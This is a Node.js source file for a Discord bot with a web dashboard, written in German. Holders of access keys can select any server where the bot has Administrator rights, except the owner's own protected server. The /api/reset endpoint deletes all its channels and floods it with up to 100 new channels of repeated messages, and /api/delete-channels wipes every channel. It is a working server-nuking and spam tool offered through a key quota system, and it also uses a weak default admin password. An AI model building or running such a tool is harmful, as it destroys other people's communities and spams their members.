import { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ButtonBuilder, ButtonStyle } from 'discord.js';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ============ KONFIGURATION ============
const PROTECTED_SERVER_ID = '1524503955693113505';
const KEY_COMMAND_CHANNEL_ID = 'get-rdkey';
const LOG_CATEGORY_NAME = 'Resettet Server';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const VERIFY_ROLE_NAME = 'Verifiziert';
const VERIFY_CHANNEL_NAME = 'verifizieren';
const REQUEST_CHANNEL_NAME = 'anfragen';
const KEYS_FILE = '/opt/render/project/src/keys.json';
const VERIFY_FILE = '/opt/render/project/src/verify.json';

// ============ KEY-SYSTEM ============
let userKeys = [
    { key: 'DEMO-KEY-1234', remainingResets: 2, created: Date.now(), createdBy: 'System' },
    { key: 'SCHULE-2026', remainingResets: 5, created: Date.now(), createdBy: 'System' }
];

try {
    if (fs.existsSync(KEYS_FILE)) {
        userKeys = JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8'));
        console.log(`📂 ${userKeys.length} Keys aus Datei geladen`);
    }
} catch (e) {}

function saveKeys() { try { fs.writeFileSync(KEYS_FILE, JSON.stringify(userKeys, null, 2), 'utf8'); } catch (e) {} }

function generateKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * 4) + 15;
    let key = '';
    for (let i = 0; i < length; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
    return key;
}

function validateKey(userKey) {
    const key = userKeys.find(k => k.key === userKey);
    if (!key) return { valid: false, reason: 'Ungültiger Key' };
    if (key.remainingResets <= 0) return { valid: false, reason: 'Key hat keine Resets mehr' };
    return { valid: true, key: key };
}

function useReset(userKey) {
    const key = userKeys.find(k => k.key === userKey);
    if (key && key.remainingResets > 0) { key.remainingResets--; saveKeys(); return true; }
    return false;
}

// ============ VERIFIZIERUNG ============
let verificationRequests = [];
try {
    if (fs.existsSync(VERIFY_FILE)) {
        verificationRequests = JSON.parse(fs.readFileSync(VERIFY_FILE, 'utf8'));
        console.log(`📂 ${verificationRequests.length} Verifizierungs-Anfragen geladen`);
    }
} catch (e) {}
function saveVerifyData() { try { fs.writeFileSync(VERIFY_FILE, JSON.stringify(verificationRequests, null, 2), 'utf8'); } catch (e) {} }

// ============ LOGGING ============
async function logResetToProtectedServer(guild, data) {
    try {
        const protectedGuild = client.guilds.cache.get(PROTECTED_SERVER_ID);
        if (!protectedGuild) return;

        let category = protectedGuild.channels.cache.find(c => c.name === LOG_CATEGORY_NAME && c.type === ChannelType.GuildCategory);
        if (!category) category = await protectedGuild.channels.create({ name: LOG_CATEGORY_NAME, type: ChannelType.GuildCategory });

        const channelName = guild.name.toLowerCase().replace(/[^a-z0-9äöü]/g, '-').replace(/-+/g, '-').substring(0, 50);
        let serverChannel = protectedGuild.channels.cache.find(c => c.name === channelName && c.parentId === category.id);
        if (!serverChannel) {
            serverChannel = await protectedGuild.channels.create({ name: channelName, type: ChannelType.GuildText, parent: category.id, topic: `Reset-Log für: ${guild.name}` });
        }

        const durationSeconds = ((data.endTime - data.startTime) / 1000).toFixed(1);
        const durationFormatted = durationSeconds < 60 ? `${durationSeconds} Sekunden` : `${(durationSeconds / 60).toFixed(1)} Minuten`;

        const embed = new EmbedBuilder()
            .setTitle(data.isDeleteOnly ? '🗑️ Kanäle gelöscht' : '🔄 Server-Reset')
            .setDescription(`**Server:** ${guild.name}\n**ID:** \`${guild.id}\``)
            .setColor(data.isDeleteOnly ? 0xe74c3c : 0x6c5ce7)
            .addFields([
                { name: '⏱️ Dauer', value: durationFormatted, inline: true },
                { name: '🗑️ Gelöscht', value: `${data.deletedChannels} Kanäle`, inline: true },
                { name: '📅 Datum', value: new Date().toLocaleString('de-DE'), inline: false }
            ]);

        if (!data.isDeleteOnly) {
            embed.addFields([
                { name: '🆕 Erstellt', value: `${data.createdChannels} × "${data.channelName}-X"`, inline: true },
                { name: '📨 Nachricht', value: `\`\`\`${data.message}\`\`\``, inline: false },
                { name: '🔁 Pro Kanal', value: `${data.repeat}x`, inline: true }
            ]);
        }

        embed.addFields([
            { name: '👤 Von', value: data.requestedBy || 'Unbekannt', inline: true },
            { name: '🔑 Key', value: `||${data.userKey}||`, inline: false },
            { name: '⬆️ Rest', value: `${data.remainingResets}`, inline: true }
        ]);
        if (guild.iconURL()) embed.setThumbnail(guild.iconURL({ size: 128 }));
        embed.setFooter({ text: `Reset #${resetStats.totalResets}` }).setTimestamp();
        await serverChannel.send({ embeds: [embed] });
    } catch (e) { console.error('Log-Fehler:', e.message); }
}

// ============ BOT ============
let resetStats = { totalResets: 0, history: [] };
let currentProgress = { running: false, step: '', serverName: '', progressPercent: 0 };

const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) { console.error('❌ BOT_TOKEN nicht gesetzt!'); process.exit(1); }

client.login(TOKEN);

client.once('ready', async () => {
    console.log(`✅ Bot online als ${client.user.tag}`);
    console.log(`📡 Auf ${client.guilds.cache.size} Servern`);
    console.log(`🔑 ${userKeys.length} Keys geladen`);
    console.log(`🛡️ Server ${PROTECTED_SERVER_ID} ist geschützt`);
    await sendKeyCommandEmbed();
    await sendVerifyEmbed();
});

// ============ KEY-EMBED ============
async function sendKeyCommandEmbed() {
    const guild = client.guilds.cache.get(PROTECTED_SERVER_ID);
    if (!guild) return;
    const channel = guild.channels.cache.find(c => c.name === KEY_COMMAND_CHANNEL_ID || c.id === KEY_COMMAND_CHANNEL_ID);
    if (!channel) return;

    try {
        const msgs = await channel.messages.fetch({ limit: 10 });
        for (const [_, m] of msgs.filter(m => m.author.id === client.user.id)) await m.delete().catch(() => {});
    } catch (e) {}

    const embed = new EmbedBuilder().setTitle('🔑 Key-Generator').setDescription('Erstelle Zugangsschlüssel für das Dashboard.\n\n1️⃣ Resets auswählen\n2️⃣ Name eingeben\n3️⃣ Key wird generiert').setColor(0x6c5ce7)
        .addFields({ name: '📊 Keys', value: `${userKeys.length}`, inline: true }, { name: '🔄 Resets', value: `${resetStats.totalResets}`, inline: true }).setTimestamp();
    const select = new StringSelectMenuBuilder().setCustomId('key_resets_select').setPlaceholder('Anzahl Resets').addOptions([
        { label: '1', value: '1', emoji: '1️⃣' }, { label: '2', value: '2', emoji: '2️⃣' }, { label: '3', value: '3', emoji: '3️⃣' },
        { label: '5', value: '5', emoji: '5️⃣' }, { label: '10', value: '10', emoji: '🔟' }, { label: '25', value: '25', emoji: '💎' },
        { label: '50', value: '50', emoji: '👑' }, { label: '♾️ 999', value: '999', emoji: '♾️' }
    ]);
    await channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(select)] });
}

// ============ VERIFY-EMBED ============
async function sendVerifyEmbed() {
    const guild = client.guilds.cache.get(PROTECTED_SERVER_ID);
    if (!guild) return;
    const channel = guild.channels.cache.find(c => c.name === VERIFY_CHANNEL_NAME);
    if (!channel) return;

    try {
        const msgs = await channel.messages.fetch({ limit: 10 });
        for (const [_, m] of msgs.filter(m => m.author.id === client.user.id)) await m.delete().catch(() => {});
    } catch (e) {}

    const embed = new EmbedBuilder().setTitle('✅ Verifizierung').setDescription('Willkommen!\n\nKlicke auf den grünen Button um eine Anfrage zu stellen.\n\n⏳ Bearbeitung: 1-3 Tage.').setColor(0x00d26a).setTimestamp();
    const btn = new ButtonBuilder().setCustomId('verify_request').setLabel('✅ Verifizieren').setStyle(ButtonStyle.Success);
    await channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(btn)] });
}

// ============ INTERACTIONS ============
client.on('interactionCreate', async (interaction) => {
    // Verify Button
    if (interaction.isButton() && interaction.customId === 'verify_request') {
        const member = interaction.member;
        const guild = interaction.guild;
        if (member.roles.cache.find(r => r.name === VERIFY_ROLE_NAME)) return interaction.reply({ content: '✅ Du bist bereits verifiziert!', ephemeral: true });
        const existing = verificationRequests.find(r => r.userId === member.id && r.status === 'pending');
        if (existing) return interaction.reply({ content: '⏳ Du hast bereits eine Anfrage gestellt.', ephemeral: true });
        const rejected = verificationRequests.find(r => r.userId === member.id && r.status === 'rejected');
        if (rejected && Date.now() - rejected.timestamp < 86400000) {
            const rem = new Date(rejected.timestamp + 86400000);
            return interaction.reply({ content: `❌ Abgelehnt. Erneut möglich: ${rem.toLocaleString('de-DE')}`, ephemeral: true });
        }
        verificationRequests.push({ userId: member.id, username: member.user.tag, displayName: member.displayName, joinedAt: member.joinedAt?.toISOString() || '?', createdAt: member.user.createdAt.toISOString(), roles: member.roles.cache.map(r => r.name).join(', '), status: 'pending', timestamp: Date.now() });
        saveVerifyData();
        await interaction.reply({ content: '✅ Anfrage eingereicht!\n\n⏳ Warte auf Verifizierung (1-3 Tage).', ephemeral: true });
        const reqCh = guild.channels.cache.find(c => c.name === REQUEST_CHANNEL_NAME);
        if (reqCh) {
            const emb = new EmbedBuilder().setTitle('📋 Neue Anfrage').setColor(0xfdcb6e).setThumbnail(member.user.displayAvatarURL({ size: 256 }))
                .addFields({ name: '👤 User', value: member.user.tag, inline: true }, { name: '🆔 ID', value: member.id, inline: true }, { name: '📅 Account', value: member.user.createdAt.toLocaleString('de-DE'), inline: true }, { name: '📥 Server', value: member.joinedAt?.toLocaleString('de-DE') || '?', inline: true }, { name: '🎭 Rollen', value: member.roles.cache.map(r => r.name).join(', ') || 'Keine' }).setTimestamp();
            const acc = new ButtonBuilder().setCustomId(`verify_accept_${member.id}`).setLabel('✅ Annehmen').setStyle(ButtonStyle.Success);
            const rej = new ButtonBuilder().setCustomId(`verify_reject_${member.id}`).setLabel('❌ Ablehnen').setStyle(ButtonStyle.Danger);
            await reqCh.send({ embeds: [emb], components: [new ActionRowBuilder().addComponents(acc, rej)] });
        }
    }

    // Verify Accept
    if (interaction.isButton() && interaction.customId.startsWith('verify_accept_')) {
        const uid = interaction.customId.replace('verify_accept_', '');
        const member = await interaction.guild.members.fetch(uid).catch(() => null);
        if (!member) return interaction.reply({ content: '❌ User nicht gefunden.', ephemeral: true });
        const req = verificationRequests.find(r => r.userId === uid && r.status === 'pending');
        if (!req) return interaction.reply({ content: '❌ Keine Anfrage.', ephemeral: true });
        let role = interaction.guild.roles.cache.find(r => r.name === VERIFY_ROLE_NAME);
        if (!role) role = await interaction.guild.roles.create({ name: VERIFY_ROLE_NAME, color: 0x00d26a });
        await member.roles.add(role).catch(() => {});
        req.status = 'accepted'; saveVerifyData();
        try { await member.send(`✅ Verifiziert auf **${interaction.guild.name}**!`); } catch (e) {}
        const emb = EmbedBuilder.from(interaction.message.embeds[0]).setColor(0x00d26a).setFooter({ text: `✅ Angenommen von ${interaction.user.tag}` });
        await interaction.update({ embeds: [emb], components: [] });
    }

    // Verify Reject
    if (interaction.isButton() && interaction.customId.startsWith('verify_reject_')) {
        const uid = interaction.customId.replace('verify_reject_', '');
        const modal = new ModalBuilder().setCustomId(`reject_modal_${uid}`).setTitle('Ablehnungsgrund');
        const input = new TextInputBuilder().setCustomId('reject_reason').setLabel('Warum?').setPlaceholder('Grund...').setStyle(TextInputStyle.Paragraph).setRequired(true).setMaxLength(500);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    // Reject Modal
    if (interaction.isModalSubmit() && interaction.customId.startsWith('reject_modal_')) {
        const uid = interaction.customId.replace('reject_modal_', '');
        const reason = interaction.fields.getTextInputValue('reject_reason');
        const member = await interaction.guild.members.fetch(uid).catch(() => null);
        const req = verificationRequests.find(r => r.userId === uid && r.status === 'pending');
        if (!req) return interaction.reply({ content: '❌ Keine Anfrage.', ephemeral: true });
        req.status = 'rejected'; req.rejectReason = reason; req.timestamp = Date.now(); saveVerifyData();
        if (member) { try { await member.send(`❌ Abgelehnt: ${reason}\nErneut in 24h möglich.`); } catch (e) {} }
        const emb = EmbedBuilder.from(interaction.message.embeds[0]).setColor(0xe74c3c).addFields({ name: '❌ Abgelehnt', value: interaction.user.tag, inline: true }, { name: '📝 Grund', value: reason }).setFooter({ text: '❌ Abgelehnt' });
        await interaction.message.edit({ embeds: [emb], components: [] });
        await interaction.reply({ content: '✅ Abgelehnt.', ephemeral: true });
    }

    // Key Dropdown
    if (interaction.isStringSelectMenu() && interaction.customId === 'key_resets_select') {
        const resets = interaction.values[0];
        const modal = new ModalBuilder().setCustomId(`key_modal_${resets}`).setTitle('Neuen Key erstellen');
        const input = new TextInputBuilder().setCustomId('key_name').setLabel('Name').setPlaceholder('z.B. Team-A').setStyle(TextInputStyle.Short).setRequired(true).setMaxLength(30);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    // Key Modal
    if (interaction.isModalSubmit() && interaction.customId.startsWith('key_modal_')) {
        const resets = parseInt(interaction.customId.split('_')[2]);
        const keyName = interaction.fields.getTextInputValue('key_name');
        const newKey = generateKey();
        userKeys.push({ key: newKey, remainingResets: resets, created: Date.now(), createdBy: interaction.user.tag });
        saveKeys();
        const g = interaction.guild;
        let kc = g.channels.cache.find(c => c.name === '🔑-key-log' && c.type === ChannelType.GuildText);
        if (!kc) {
            kc = await g.channels.create({ name: '🔑-key-log', type: ChannelType.GuildText, permissionOverwrites: [{ id: g.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] }, { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }] });
            g.roles.cache.filter(r => r.permissions.has(PermissionsBitField.Flags.Administrator)).forEach(r => kc.permissionOverwrites.create(r, { ViewChannel: true, SendMessages: false }).catch(() => {}));
        }
        const emb = new EmbedBuilder().setTitle('🔑 Neuer Key').setColor(0x00d26a).addFields({ name: '📛 Name', value: keyName, inline: true }, { name: '🔄 Resets', value: `${resets === 999 ? 'Unbegrenzt' : resets}`, inline: true }, { name: '🔑 Key', value: `\`\`\`${newKey}\`\`\``, inline: false }, { name: '👤 Von', value: interaction.user.tag }).setTimestamp();
        await kc.send({ embeds: [emb] });
        await interaction.reply({ content: `✅ Key: \`${newKey}\` (${resets === 999 ? 'Unbegrenzt' : resets} Resets)`, ephemeral: true });
        await sendKeyCommandEmbed();
    }
});

// ============ API ============
app.get('/api/status', (req, res) => res.json({ online: client.isReady(), username: client.user?.tag || 'Offline', serverCount: client.guilds.cache.size, ...currentProgress, stats: resetStats }));
app.post('/api/validate-key', (req, res) => {
    const { userKey } = req.body;
    if (!userKey) return res.json({ valid: false, reason: 'Kein Key' });
    const r = validateKey(userKey);
    res.json({ valid: r.valid, reason: r.reason, remainingResets: r.key?.remainingResets || 0 });
});
app.post('/api/servers', (req, res) => {
    const { userKey } = req.body;
    if (!validateKey(userKey).valid) return res.status(403).json({ error: 'Ungültiger Key' });
    if (!client.isReady()) return res.json([]);
    res.json(client.guilds.cache.filter(g => g.id !== PROTECTED_SERVER_ID && g.members.me?.permissions.has(PermissionsBitField.Flags.Administrator)).map(g => ({ id: g.id, name: g.name })));
});

app.post('/api/reset', async (req, res) => {
    const { userKey, serverId, channelCount, channelName, channelMessage, messageRepeat, requestedBy } = req.body;
    const startTime = Date.now();
    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Geschützt!' });
    const keyCheck = validateKey(userKey);
    if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
    if (currentProgress.running) return res.status(400).json({ error: 'Läuft bereits' });
    const guild = client.guilds.cache.get(serverId);
    if (!guild) return res.status(404).json({ error: 'Nicht gefunden' });
    if (!guild.members.me?.permissions.has(PermissionsBitField.Flags.Administrator)) return res.status(403).json({ error: 'Keine Admin-Rechte' });

    currentProgress = { running: true, step: 'Lösche alte Kanäle...', serverName: guild.name, progressPercent: 0 };
    try {
        const channels = guild.channels.cache.filter(c => c.deletable);
        const total = channels.size;
        let deleted = 0;
        for (const [_, ch] of channels) {
            await ch.delete().catch(() => {});
            deleted++;
            currentProgress.progressPercent = Math.floor((deleted / Math.max(total, 1)) * 30);
            currentProgress.step = `Lösche Kanal ${deleted}/${total}...`;
            await new Promise(r => setTimeout(r, 200));
        }

        const logCh = await guild.channels.create({ name: '📋-server-log', type: ChannelType.GuildText, permissionOverwrites: [{ id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.SendMessages] }] });
        currentProgress.progressPercent = 35;
        currentProgress.step = 'Erstelle neue Kanäle...';

        const count = Math.min(parseInt(channelCount) || 5, 100);
        const name = channelName || 'kanal';
        const message = channelMessage || '✅ Kanal bereit!';
        const repeat = Math.min(parseInt(messageRepeat) || 1, 10);
        const created = [];

        for (let i = 1; i <= count; i++) {
            const ch = await guild.channels.create({ name: `${name}-${i}`, type: ChannelType.GuildText }).catch(() => null);
            if (ch) created.push(ch);
            currentProgress.progressPercent = 35 + Math.floor((i / count) * 45);
            currentProgress.step = `Erstelle Kanal ${i}/${count}: ${name}-${i}`;
            await new Promise(r => setTimeout(r, 300));
        }

        currentProgress.progressPercent = 80;
        currentProgress.step = 'Sende Nachrichten...';
        const totalMsg = created.length * repeat;
        let sent = 0;
        for (const ch of created) {
            for (let m = 1; m <= repeat; m++) {
                await ch.send({ content: message }).catch(() => {});
                sent++;
                currentProgress.progressPercent = 80 + Math.floor((sent / Math.max(totalMsg, 1)) * 18);
                currentProgress.step = `Nachricht ${sent}/${totalMsg} gesendet...`;
                await new Promise(r => setTimeout(r, 300));
            }
        }

        useReset(userKey);
        const endTime = Date.now();
        currentProgress.progressPercent = 99;
        currentProgress.step = 'Fertig! ✅';

        await logCh.send({ content: `✅ Reset fertig!\n📊 Gelöscht: ${deleted} | Neu: ${count} × "${name}-X"\n🔑 Rest: ${keyCheck.key.remainingResets - 1}` });
        resetStats.totalResets++;
        resetStats.history.unshift({ server: guild.name, timestamp: Date.now(), channelsCreated: count });
        if (resetStats.history.length > 50) resetStats.history.pop();
        await logResetToProtectedServer(guild, { startTime, endTime, deletedChannels: deleted, createdChannels: count, channelName: name, message, repeat, userKey, remainingResets: keyCheck.key.remainingResets - 1, isDeleteOnly: false, requestedBy: requestedBy || 'Unbekannt' });
        currentProgress = { running: false, step: '✅ Fertig!', serverName: guild.name, progressPercent: 100 };
        res.json({ success: true, remainingResets: keyCheck.key.remainingResets - 1 });
    } catch (err) { currentProgress = { running: false, step: '❌ Fehler!', serverName: guild.name, progressPercent: 0 }; res.status(500).json({ error: err.message }); }
});

app.post('/api/delete-channels', async (req, res) => {
    const { userKey, serverId, requestedBy } = req.body;
    const startTime = Date.now();
    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Geschützt!' });
    const keyCheck = validateKey(userKey);
    if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
    const guild = client.guilds.cache.get(serverId);
    if (!guild) return res.status(404).json({ error: 'Nicht gefunden' });
    currentProgress = { running: true, step: 'Lösche alle Kanäle...', serverName: guild.name, progressPercent: 0 };
    const channels = guild.channels.cache.filter(c => c.deletable);
    const total = channels.size;
    let deleted = 0;
    for (const [_, ch] of channels) {
        await ch.delete().catch(() => {});
        deleted++;
        currentProgress.progressPercent = Math.floor((deleted / Math.max(total, 1)) * 100);
        currentProgress.step = `Kanal ${deleted}/${total} gelöscht...`;
        await new Promise(r => setTimeout(r, 200));
    }
    useReset(userKey);
    const endTime = Date.now();
    currentProgress = { running: false, step: '✅ Alle Kanäle gelöscht', serverName: guild.name, progressPercent: 100 };
    await logResetToProtectedServer(guild, { startTime, endTime, deletedChannels: deleted, createdChannels: 0, channelName: '', message: '', repeat: 0, userKey, remainingResets: keyCheck.key.remainingResets - 1, isDeleteOnly: true, requestedBy: requestedBy || 'Unbekannt' });
    res.json({ success: true, deleted, remainingResets: keyCheck.key.remainingResets - 1 });
});

// Admin
app.post('/api/admin/login', (req, res) => res.json({ success: req.body.password === ADMIN_PASSWORD }));
app.post('/api/admin/keys', (req, res) => {
    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    res.json(userKeys.map(k => ({ key: k.key, remainingResets: k.remainingResets, created: k.created, createdBy: k.createdBy })));
});
app.post('/api/admin/create-key', (req, res) => {
    const { password, keyName, maxResets } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    if (!keyName || !maxResets) return res.status(400).json({ error: 'Daten fehlen' });
    const nk = { key: generateKey(), remainingResets: parseInt(maxResets), created: Date.now(), createdBy: 'Admin' };
    userKeys.push(nk); saveKeys();
    res.json({ success: true, key: nk });
});
app.post('/api/admin/delete-key', (req, res) => {
    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    userKeys = userKeys.filter(k => k.key !== req.body.key); saveKeys();
    res.json({ success: true });
});
app.post('/api/admin/refill-key', (req, res) => {
    const { password, key, amount } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    const fk = userKeys.find(k => k.key === key);
    if (!fk) return res.status(404).json({ error: 'Nicht gefunden' });
    fk.remainingResets += parseInt(amount); saveKeys();
    res.json({ success: true, key: fk });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Port ${PORT}`));